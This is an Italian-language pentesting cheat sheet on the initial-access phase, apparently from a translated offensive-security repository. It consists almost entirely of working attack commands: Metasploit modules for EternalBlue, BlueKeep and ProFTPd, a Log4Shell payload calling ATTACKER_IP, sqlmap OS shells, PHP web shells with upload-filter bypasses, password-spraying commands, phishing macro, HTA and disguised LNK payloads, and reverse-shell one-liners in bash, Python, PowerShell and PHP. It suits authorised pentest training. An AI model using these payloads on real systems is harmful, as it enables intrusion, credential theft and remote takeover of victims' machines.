# 🚪 Fase 1: Initial Access

```
  ██╗███╗   ██╗██╗████████╗██╗ █████╗ ██╗          █████╗  ██████╗ ██████╗███████╗███████╗███████╗
  ██║████╗  ██║██║╚══██╔══╝██║██╔══██╗██║         ██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝
  ██║██╔██╗ ██║██║   ██║   ██║███████║██║         ███████║██║     ██║     █████╗  ███████╗███████╗
  ██║██║╚██╗██║██║   ██║   ██║██╔══██║██║         ██╔══██║██║     ██║     ██╔══╝  ╚════██║╚════██║
  ██║██║ ╚████║██║   ██║   ██║██║  ██║███████╗    ██║  ██║╚██████╗╚██████╗███████╗███████║███████║
  ╚═╝╚═╝  ╚═══╝╚═╝   ╚═╝   ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝
```

**Obiettivo:** Ottenere il primo accesso alla rete o al sistema target.

---

## 🎯 Vettori di Attacco

| Vettore | Descrizione |
|---------|-------------|
| **Exploit Public-Facing App** | Vulnerabilità in web app, API, CMS |
| **Phishing** | Email malevole con payload |
| **Valid Credentials** | Password spraying, credential stuffing |
| **External Services** | RDP, SSH, VPN, FTP esposti |
| **Supply Chain** | Compromissione di software fidato |

---

## 💻 Sfruttamento di Vulnerabilità Note

### Ricerca di Exploit
```bash
# SearchSploit - Database locale di exploit
searchsploit apache 2.4
searchsploit -m 41234  # Copia exploit nella cartella corrente
searchsploit --nmap scan.xml  # Analizza risultati Nmap

# Ricerca in Metasploit
msfconsole -q -x "search type:exploit apache"
```

### Exploit Comuni

#### EternalBlue (MS17-010) - Windows SMB
```bash
# Verifica vulnerabilità
nmap -p 445 --script smb-vuln-ms17-010 192.168.1.10

# Exploit con Metasploit
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set LHOST 10.10.10.10
run
```

#### Log4Shell (CVE-2021-44228)
```bash
# Test di vulnerabilità
curl -H 'X-Api-Version: ${jndi:ldap://ATTACKER_IP:1389/a}' http://target.com

# Setup exploit server
java -jar JNDI-Exploit.jar -C "bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}" -A ATTACKER_IP
```

#### ProxyShell/ProxyLogon - Exchange
```bash
# Scansione per ProxyShell
nmap -p 443 --script http-vuln-exchange-proxyshell 192.168.1.10

# Usa exploit
python3 proxyshell_exploit.py -t https://exchange.target.com -e attacker@evil.com
```

---

## 🌐 Attacchi a Web Application

### SQL Injection (Get Shell)
```bash
# Test per SQLi
sqlmap -u "http://target.com/page?id=1" --batch

# Ottieni shell OS via SQLi
sqlmap -u "http://target.com/page?id=1" --os-shell

# Ottieni shell SQL
sqlmap -u "http://target.com/page?id=1" --sql-shell
```

### File Upload per Shell
```bash
# Crea una reverse shell PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.php

# O una semplice shell PHP
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Bypass dei filtri sulle estensioni
shell.php.jpg
shell.pHp
shell.php%00.jpg
shell.php;.jpg
```

### Remote Code Execution (RCE)
```bash
# Test per RCE
curl "http://target.com/cmd.php?cmd=id"
curl "http://target.com/cmd.php?cmd=whoami"

# Reverse shell via RCE
curl "http://target.com/cmd.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.10.10.10/4444%200>%261'"
```

---

## 🔐 Credentials Attacks

### Password Spraying
```bash
# CrackMapExec - SMB
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Spring2024!' --continue-on-success

# CrackMapExec - WinRM
crackmapexec winrm 192.168.1.0/24 -u users.txt -p passwords.txt

# Hydra - SSH
hydra -L users.txt -P passwords.txt ssh://192.168.1.10

# Hydra - RDP
hydra -L users.txt -P passwords.txt rdp://192.168.1.10
```

### Credential Stuffing
```bash
# Uso di credenziali leakate note
hydra -C creds.txt ftp://192.168.1.10

# Formato per creds.txt:
# username:password
```

### Credenziali di Default
```bash
# Default comuni da provare:
admin:admin
admin:password
root:root
root:toor
administrator:password

# CrackMapExec con credenziali comuni
crackmapexec smb 192.168.1.10 -u admin -p 'admin'
```

---

## 📧 Payload per Phishing

### Payload Macro Office
```bash
# Genera payload macro
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f vba -o macro.vba

# O usa msfconsole
use exploit/multi/fileformat/office_word_macro
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
run
```

### Payload HTA
```bash
# Genera file HTA
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f hta-psh -o evil.hta

# Hostalo
python3 -m http.server 80
```

### Payload LNK
```powershell
# Crea shortcut malevolo
$obj = New-Object -ComObject WScript.Shell
$link = $obj.CreateShortcut("C:\Users\Public\Resume.lnk")
$link.TargetPath = "cmd.exe"
$link.Arguments = "/c powershell -ep bypass -w hidden -c IEX(payload)"
$link.IconLocation = "C:\Windows\System32\notepad.exe"
$link.Save()
```

---

## 🖥️ Sfruttamento di Servizi Esterni

### Sfruttamento RDP
```bash
# Brute force RDP
hydra -L users.txt -P passwords.txt rdp://192.168.1.10

# BlueKeep (CVE-2019-0708)
msfconsole -q
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 192.168.1.10
run
```

### Sfruttamento SSH
```bash
# Brute force SSH
hydra -L users.txt -P passwords.txt ssh://192.168.1.10

# SSH con credenziali note
ssh user@192.168.1.10

# SSH con chiave privata
ssh -i id_rsa user@192.168.1.10
```

### Sfruttamento FTP
```bash
# Login anonimo
ftp 192.168.1.10
# Username: anonymous
# Password: anonymous

# Brute force
hydra -L users.txt -P passwords.txt ftp://192.168.1.10

# Exploit ProFTPd
msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS 192.168.1.10; run"
```

---

## 🎧 Setup dei Listener

### Listener Netcat
```bash
nc -lvnp 4444
```

### Handler Metasploit
```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
run
```

### Powercat (PowerShell)
```powershell
# Su attaccante
powercat -l -p 4444

# Su vittima
powercat -c 10.10.10.10 -p 4444 -e cmd.exe
```

---

## 📊 Riferimento Rapido

### Reverse Shell One-Liners

| OS/Linguaggio | Comando |
|----|---------|
| **Bash** | `bash -i >& /dev/tcp/10.10.10.10/4444 0>&1` |
| **Python** | `python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'` |
| **PowerShell** | `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.10.10.10',4444);$s=$c.GetStream();[byte[]]$b=0..65535\|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1\|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"` |
| **PHP** | `php -r '$s=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'` |

---

## 🔗 Cheatsheet Correlati

- [Metasploit](../Metasploit/translations/README.it.md)
- [SQLMap](../SQLMap/translations/README.it.md)
- [Hydra](../Hydra/translations/README.it.md)
- [Web Vulnerabilities](../SSRF/translations/README.it.md)

---

**Fase Successiva:** [02 - Enumeration/Discovery →](./02-Enumeration.it.md)
